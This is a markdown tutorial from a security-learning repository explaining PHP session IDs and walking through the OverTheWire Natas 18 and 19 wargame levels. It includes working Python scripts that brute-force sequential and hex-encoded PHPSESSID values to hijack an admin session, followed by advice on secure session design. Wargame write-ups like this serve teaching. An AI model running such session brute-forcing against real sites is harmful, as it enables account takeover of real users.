# 🌐 Web Security — Session Brute-Force

> The server gives each user a session ID and, when asking "who are you?",
> looks at this ID. But what if the ID is guessable?

---

## 📋 Table of Contents

- [What Is a Session?](#what-is-a-session)
- [How Does PHPSESSID Work?](#how-does-phpsessid-work)
- [Predictable Session ID](#predictable-session-id)
- [Session Brute-Force](#session-brute-force)
- [Usage in Natas](#usage-in-natas)

---

## What Is a Session?

HTTP is stateless — the server evaluates each request independently. The session mechanism solves this problem:

```
1. The user logs in
2. The server generates a random session ID
3. This ID is given to the browser as a cookie: Set-Cookie: PHPSESSID=abc123
4. The user sends this ID with every request: Cookie: PHPSESSID=abc123
5. The server looks at the ID and says "this user is logged in"
```

The session data is stored **on the server** (file, database, memory). The cookie only carries the key.

```
Browser                     Server
  PHPSESSID=abc123   →       look at the file /tmp/sess_abc123
                            username=admin
                            isloggedin=true
```

---

## How Does PHPSESSID Work?

By default, PHP stores session IDs in files in the form `/tmp/sess_[ID]`.

```php
session_start();                    // Start the session
$_SESSION['user'] = 'admin';        // Write data to the session
echo session_id();                  // Show the current session ID
```

A secure session ID looks like this:

```
PHPSESSID=4f3c2b1a9e8d7f6a5b4c3d2e1f0a9b8c   ← 128-bit random
```

Insecure (predictable):

```
PHPSESSID=1
PHPSESSID=2
PHPSESSID=100
PHPSESSID=admin1
```

---

## Predictable Session ID

In Natas 18 and 19, the session IDs are in a guessable range.

### Natas 18 — Sequential Numeric ID

```php
$maxid = 640;   // Maximum session ID

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
        return 1;
    }
    return 0;
}

session_id(my_session_id());   // Assign a custom session ID
session_start();

if(isValidAdminLogin()) {
    $_SESSION['admin'] = 1;
}
```

The session ID is between 1 and 640. If admin has logged in at any time, that session may still be active.

### Natas 19 — Encoded ID

```
Normal:   PHPSESSID=1
Natas 19: PHPSESSID=3135352d61646d696e   ← hex-encoded "155-admin"
```

Format: `[number]-[username]` → hex encode

The IDs to try for the `admin` user:
```
1-admin   → hex → 312d61646d696e
2-admin   → hex → 322d61646d696e
...
640-admin → hex → 3634302d61646d696e
```

---

## Session Brute-Force

Trying all possible session IDs to find a valid admin session.

### Basic Logic

```python
for session_id in range(1, 641):
    response = requests.get(url, cookies={"PHPSESSID": str(session_id)}, auth=...)
    if "Password" in response.text:   # admin session found
        print(f"Admin session ID: {session_id}")
        break
```

### Python for Natas 18

```python
import requests

url      = "http://natas18.natas.labs.overthewire.org/"
username = "natas18"
password = "[natas18_password]"

for session_id in range(1, 641):
    r = requests.get(
        url,
        cookies={"PHPSESSID": str(session_id)},
        auth=(username, password)
    )
    if "You are an admin" in r.text:
        print(f"[✓] Admin session ID found: {session_id}")
        print(r.text)
        break

    if session_id % 50 == 0:
        print(f"[*] Tried {session_id}/640...")
```

### Python for Natas 19

```python
import requests

url      = "http://natas19.natas.labs.overthewire.org/"
username = "natas19"
password = "[natas19_password]"

for i in range(1, 641):
    # "i-admin" → hex encode
    raw = f"{i}-admin"
    hex_id = raw.encode().hex()

    r = requests.get(
        url,
        cookies={"PHPSESSID": hex_id},
        auth=(username, password)
    )
    if "You are an admin" in r.text:
        print(f"[✓] Found! ID: {i}-admin → {hex_id}")
        print(r.text)
        break

    if i % 50 == 0:
        print(f"[*] Tried {i}/640...")
```

---

## Usage in Natas

### Natas 18 — Sequential PHPSESSID

**Source code (summary):**

```php
$maxid = 640;

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") { return 1; }
    return 0;
}

my_session_id() → picks a random number between 1 and 640
```

**Exploit:** Try all session IDs between 1-640. If any of them has an admin session, the "You are an admin" message appears.

---

### Natas 19 — Hex Encoded Session ID

**Observation:** The cookie value looks like hex.

```bash
# Decode the cookie
echo "3331322d61646d696e" | xxd -r -p
# 312-admin
```

Format: `[number]-[user]` hex encoded.

**Exploit:** Convert all combinations between `1-admin` and `640-admin` to hex and try them.

---

### Session Security — The Right Approach

```
Insecure ✗                    Secure ✓
─────────────────────         ──────────────────────────
PHPSESSID=1,2,3...            Cryptographically random ID
PHPSESSID=[username]          Opaque token (meaningless)
Short/predictable            128+ bits of entropy
Valid forever                Time limit + delete on logout
```

---

## 🔗 Resources

- [PortSwigger — Session Hijacking](https://portswigger.net/web-security/authentication/other-mechanisms)
- [OWASP — Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PHP — session_id()](https://www.php.net/manual/en/function.session-id.php)

---

**Previous topic:** [13_command_injection_advanced.md](./13_command_injection_advanced.md)
**Next topic:** [15_session_and_newline_injection.md](./15_session_and_newline_injection.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
